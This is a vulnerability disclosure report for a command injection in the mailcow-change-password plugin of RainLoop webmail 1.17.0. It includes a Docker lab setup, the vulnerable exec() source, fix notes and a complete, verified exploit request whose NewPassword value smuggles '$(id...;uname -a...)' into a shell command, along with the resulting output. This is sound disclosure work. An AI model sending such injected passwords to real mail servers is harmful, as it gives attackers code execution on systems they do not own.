### Vulnerability details

**Official website / Product:** https://www.rainloop.net/ / https://github.com/RainLoop/rainloop-webmail

**Repository:** RainLoop/rainloop-webmail (stars at selection: 4111)

**Vulnerability type:** RCE / getshell (command injection in mailcow-change-password ChangePassword)

**Vulnerability versions:** v1.17.0 legacy (`rainloop-legacy-1.17.0.zip`); same plugin still present on master `9bf8fa5b63d7e6871ee533126a7e1b1c85ee45b5`

**Vulnerability URL / Parameter:** `POST /?/Ajax/&q[]=/{AuthAccountHash}/` with form fields `Action=ChangePassword` and `NewPassword` (interpolated into `exec()` as `$sNewPassword`)

**Complex:** yes

### Verification procedure

1. Rebuild the lab (original `labs/rainloop-r33-a7/` was cleaned after verify; image `rainloop-r33-a7-web` and peers removed). In any working directory write the `Dockerfile` / `docker-compose.yml` / `init-mailcow.sql` below, then build and start. Topology:
   - Web: `php:7.4-apache` + official `rainloop-legacy-1.17.0.zip`, host port **21307** → container 80; container `rainloop-r33-a7-web`.
   - Mail: `greenmail/standalone:1.6.15` (IMAP **3143** inside the compose network for Webmail login); container `rainloop-r33-a7-mail`.
   - DB: `mysql:5.7` with mailcow-like schema (`mailcow` DB, user/pass `rainloop`/`rainloop`) including `mailbox` and `users` tables; container `rainloop-r33-a7-db`.
   - Accounts: Webmail `user@example.com` / `Passw0rd!`; admin `admin` / `12345`.
   - Audited version: v1.17.0 / `rainloop-legacy-1.17.0.zip`; source peer `9bf8fa5b63d7e6871ee533126a7e1b1c85ee45b5`.

```dockerfile
# Dockerfile — php:7.4-apache + RainLoop legacy 1.17.0
FROM php:7.4-apache
RUN docker-php-ext-install pdo pdo_mysql \
    && a2enmod rewrite \
    && apt-get update && apt-get install -y --no-install-recommends unzip curl \
    && rm -rf /var/lib/apt/lists/*
# Official release zip: https://github.com/RainLoop/rainloop-webmail/releases/download/v1.17.0/rainloop-legacy-1.17.0.zip
COPY rainloop-legacy-1.17.0.zip /tmp/rainloop.zip
RUN unzip -q /tmp/rainloop.zip -d /var/www/html \
    && rm /tmp/rainloop.zip \
    && chown -R www-data:www-data /var/www/html
```

```yaml
# docker-compose.yml
services:
  web:
    build: .
    image: rainloop-r33-a7-web
    container_name: rainloop-r33-a7-web
    ports:
      - "21307:80"
    depends_on:
      - db
      - mail
  mail:
    image: greenmail/standalone:1.6.15
    container_name: rainloop-r33-a7-mail
    # GreenMail defaults: SMTP 3025, IMAP 3143; pre-seed user@example.com / Passw0rd!
    environment:
      GREENMAIL_OPTS: >-
        -Dgreenmail.setup.test.all
        -Dgreenmail.users=user@example.com:Passw0rd!
        -Dgreenmail.hostname=0.0.0.0
  db:
    image: mysql:5.7
    container_name: rainloop-r33-a7-db
    environment:
      MYSQL_ROOT_PASSWORD: root
      MYSQL_DATABASE: mailcow
      MYSQL_USER: rainloop
      MYSQL_PASSWORD: rainloop
    volumes:
      - ./init-mailcow.sql:/docker-entrypoint-initdb.d/init-mailcow.sql:ro
```

```sql
-- init-mailcow.sql — mailcow-like schema for the plugin
CREATE TABLE mailbox (
  username VARCHAR(255) PRIMARY KEY,
  password VARCHAR(255) NOT NULL
);
CREATE TABLE users (
  username VARCHAR(255) PRIMARY KEY,
  digesta1 VARCHAR(255) NOT NULL
);
-- Salt ABCDEFGHIJKLMNOP (16 chars after $6$); verifies PrevPassword=Passw0rd!
-- Regenerated with: php -r 'echo "{SHA512-CRYPT}".crypt("Passw0rd!","$6$ABCDEFGHIJKLMNOP");'
INSERT INTO mailbox (username, password) VALUES (
  'user@example.com',
  '{SHA512-CRYPT}$6$ABCDEFGHIJKLMNOP$HQUnQpq1PB.7hiv7zRdaXJB8zp1NnnuNU06o/KYihIobbnzdgNsyJp/huFYNx4SiDF9fHZHj1KOQpJgVrG163/'
);
INSERT INTO users (username, digesta1) VALUES (
  'user@example.com',
  MD5(CONCAT('user@example.com', ':SabreDAV:', 'Passw0rd!'))
);
```

With `rainloop-legacy-1.17.0.zip` in the same directory:

```bash
docker compose up -d --build
# Expected: rainloop-r33-a7-db / rainloop-r33-a7-mail / rainloop-r33-a7-web Up;
# 0.0.0.0:21307->80/tcp
```

2. Admin login at `http://127.0.0.1:21307/?Admin`: `admin` / `12345`. Enable official plugin `mailcow-change-password` and set:
   - `pdo_dsn` = `mysql:host=db;dbname=mailcow`
   - `user` / `password` = `rainloop` / `rainloop`
   - `allowed_emails` = `*`
   Also point domain/login IMAP at GreenMail host `mail`, port `3143` (adjust if GreenMail mapping differs).
3. Log in as mailbox user `user@example.com` / `Passw0rd!` (must pass IMAP auth and the plugin previous-password check).
4. Collect session material (rotates each login; PoC below is the Docker-verified snapshot):
   - Cookies: `rlspecauth` (AuthAccountHash), `rlsession`, `rltoken`.
   - CSRF: `AppData` / `System.token` → body field `XToken` (required when `security.csrf_protection` is on).
   - Path `q[]=/{AuthAccountHash}/` matches cookie `rlspecauth`.
5. Send the full HTTP request below. URL-decoded `NewPassword` is:
   `Aa9$(id>/tmp/r33a7-rce.txt;uname -a>>/tmp/r33a7-rce.txt)x`
   (prefix `Aa9`…`x` satisfies default `labs.check_new_password_strength`; `$(...)` is expanded by `exec` → `/bin/sh`).
6. Response `Result` is a new AuthAccountHash (password change succeeded); container file `/tmp/r33a7-rce.txt` contains `uid=33(www-data)`:

```bash
docker exec rainloop-r33-a7-web cat /tmp/r33a7-rce.txt
```

### Complete vulnerability PoC

Complete HTTP request (Docker-verified):

```http
POST /?/Ajax/&q[]=/_KjNtAncFOz_uAuSVK9s6EMnUx8RTG1gCKec4dWyQWlATNG_y2fw0PRvxQ5nbELrR46_nkpgBGD50mQgroNQtSP7u2XY_A0zqYxG9gbRMRjVmGJB8mJEA18DcYkgLgBBMkLPj_12PTtSxWKsrxJVtVl-wnDChER0f4U-NDu4wfcaVJ1iAsqJTj-DICwxF5H4WqpQ3tzu6X19JOot01a1kfY6MaHlUaZcSlYFhhf4HPk7P-1603UnMn74jwZZyYIP2kboWIseM3ChSwgOhocxEQVk--C9XxHzTHBseJLyCfoU0jm6XjqpyfRi90axC_seoLlHHcgW4HlAhFuUZdmat3w/ HTTP/1.1
Host: 127.0.0.1:21307
User-Agent: curl/8.22.0
Accept: */*
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Origin: http://127.0.0.1:21307
Referer: http://127.0.0.1:21307/
Cookie: rlspecauth=_KjNtAncFOz_uAuSVK9s6EMnUx8RTG1gCKec4dWyQWlATNG_y2fw0PRvxQ5nbELrR46_nkpgBGD50mQgroNQtSP7u2XY_A0zqYxG9gbRMRjVmGJB8mJEA18DcYkgLgBBMkLPj_12PTtSxWKsrxJVtVl-wnDChER0f4U-NDu4wfcaVJ1iAsqJTj-DICwxF5H4WqpQ3tzu6X19JOot01a1kfY6MaHlUaZcSlYFhhf4HPk7P-1603UnMn74jwZZyYIP2kboWIseM3ChSwgOhocxEQVk--C9XxHzTHBseJLyCfoU0jm6XjqpyfRi90axC_seoLlHHcgW4HlAhFuUZdmat3w; rlsession=535238e95820c32025ebbd39a125767b; rltoken=2182bfb38f8e3bf00ea4cf1e8f30ca61
Content-Length: 178
Connection: close

XToken=751466291e0e8ca8f07984b76423dbf7&Action=ChangePassword&PrevPassword=Passw0rd%21&NewPassword=Aa9%24%28id%3E%2Ftmp%2Fr33a7-rce.txt%3Buname+-a%3E%3E%2Ftmp%2Fr33a7-rce.txt%29x
```

Complete HTTP response (raw Docker-lab response):

```http
HTTP/1.1 200 OK
Date: Mon, 02 Nov 2026 01:27:55 GMT
Server: Apache/2.4.54 (Debian)
X-Powered-By: PHP/7.4.33
X-XSS-Protection: 1; mode=block
Expires: Mon, 26 Jul 1997 05:00:00 GMT
Last-Modified: Mon, 02 Nov 2026 01:27:55 GMT
Cache-Control: no-store, no-cache, must-revalidate, max-age=0
Cache-Control: post-check=0, pre-check=0
Pragma: no-cache
Set-Cookie: rlspecauth=_vdGX33Iyv5KazTMKgLfJiNnoII-hTToqlIfjrhM67RDZstgmhZb01PorQ-ZIqm64LMQrNGQYTIsj8uJSMnVfFrTR_K5WW1TBAEm6Hro4ADv37XxUhJ7e4-9XifZv3x1kpLhr33xjNNLipJNsOxDX_TFyVZljbe4uMx2hQa_ePmeumIrPPdGAbyerZDIDOmRC2SB-x1xOMGhn5T-OItIMrEapVk922CfG-1uiNovaTzLYX6W_IXM_qreupARGjS4fpXfxApaD4-nDbQNJB9NvQiVxlI6py1oOQnD7wqliXzignGQ2Eyi6SlU4qJ0PlBVEBUdB-sN6oX20idOC6gY6LWL4oGBZXIyPJcaViwURsB1WuV8ZYCM-Vw4cH9nf1Mpv8i9yBQDv2bLYmhvvyCHwlV9t0hU; HttpOnly
Content-Length: 461
Connection: close
Content-Type: application/json; charset=utf-8

{"Action":"ChangePassword","Result":"_vdGX33Iyv5KazTMKgLfJiNnoII-hTToqlIfjrhM67RDZstgmhZb01PorQ-ZIqm64LMQrNGQYTIsj8uJSMnVfFrTR_K5WW1TBAEm6Hro4ADv37XxUhJ7e4-9XifZv3x1kpLhr33xjNNLipJNsOxDX_TFyVZljbe4uMx2hQa_ePmeumIrPPdGAbyerZDIDOmRC2SB-x1xOMGhn5T-OItIMrEapVk922CfG-1uiNovaTzLYX6W_IXM_qreupARGjS4fpXfxApaD4-nDbQNJB9NvQiVxlI6py1oOQnD7wqliXzignGQ2Eyi6SlU4qJ0PlBVEBUdB-sN6oX20idOC6gY6LWL4oGBZXIyPJcaViwURsB1WuV8ZYCM-Vw4cH9nf1Mpv8i9yBQDv2bLYmhvvyCHwlV9t0hU","Time":45}
```

Verification result notes:

- HTTP 200 with `Action=ChangePassword` and a non-empty `Result` Auth token shows the change-password path reached `exec()`.
- Container file `/tmp/r33a7-rce.txt` (`docker exec rainloop-r33-a7-web cat /tmp/r33a7-rce.txt` expected output):
```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
Linux 35146fc6500d 7.0.12+kali-amd64 #1 SMP PREEMPT_DYNAMIC Kali 7.0.12-2kali1 (2026-06-18) x86_64 GNU/Linux
```
- Demonstrates shell expansion of `$(...)` in `NewPassword`, yielding arbitrary command execution as `www-data` (getshell). Even if `/usr/bin/doveadm` is missing, PHP `exec()` still expands command substitution via the shell, so RCE holds.

### Vulnerability analysis

Official plugin `mailcow-change-password` updates SQL then runs:

`exec("/usr/bin/doveadm pw -s SHA512-CRYPT -p $sNewPassword", ...)`

`$sNewPassword` comes from `DoChangePassword` → `GetActionParam('NewPassword')` without `escapeshellarg`/`escapeshellcmd`. Shell metacharacters (`$()`, `;`, backticks) inject OS commands.

Preconditions: admin enables/configures the plugin; attacker has a mailbox account that passes IMAP login and the plugin's previous-password check (typically the user's own account). The `exec` output is unused for DB storage (`cryptPassword()` hashes instead)—a redundant, dangerous call.

Trigger / sink source (full path and line numbers):

```php
# File: plugins/mailcow-change-password/MailcowChangePasswordDriver.php
# Lines: 118-126 (exec at line 125; installed under data/_data_/_default_/plugins/mailcow-change-password/)
<?php
// plugins/mailcow-change-password/MailcowChangePasswordDriver.php
// (shipped under data/_data_/_default_/plugins/ after install; identical in RainLoop/rainloop-webmail master)
// Lines 118-126
if ('{SHA512-CRYPT}'.\crypt($sPrevPassword, '$6$'.$sDbSalt) === $sDbPassword)
{
    $oStmt = $oPdo->prepare('UPDATE mailbox SET password = ? WHERE username = ?');
    if ($oStmt->execute(array($this->cryptPassword($sNewPassword), $aFetchResult[0]['username']))) {
        $oStmt = $oPdo ->prepare('UPDATE users SET digesta1=MD5(CONCAT(?, ":SabreDAV:", ?)) WHERE username=?');
        if ($oStmt->execute(array($aFetchResult[0]['username'],$sNewPassword,$aFetchResult[0]['username']))) {
            //the MailCow & SabreDav have been updated, now update the doveadm password
            exec("/usr/bin/doveadm pw -s SHA512-CRYPT -p $sNewPassword", $hash, $return);
            $bResult = true;
        }
    }
}

```

Entry: `rainloop/v/1.17.0/app/libraries/RainLoop/Actions.php` `DoChangePassword()` lines 5036-5060 passes `PrevPassword`/`NewPassword` into `ChangePasswordProvider()->ChangePassword()` (≈5045-5048). Plugin wiring: `plugins/mailcow-change-password/index.php` `MainFabrica('change-password')` reads `pdo_dsn`/`user`/`password`/`allowed_emails`.

### Fix notes

1. Remove the unused `exec(doveadm ...)` call, or wrap with `escapeshellarg($sNewPassword)` / `proc_open` argument arrays.
2. Prefer PHP `crypt()`/`password_hash()` instead of shelling out; reject shell metacharacters in passwords.
3. Operators can disable the `mailcow-change-password` plugin until patched.
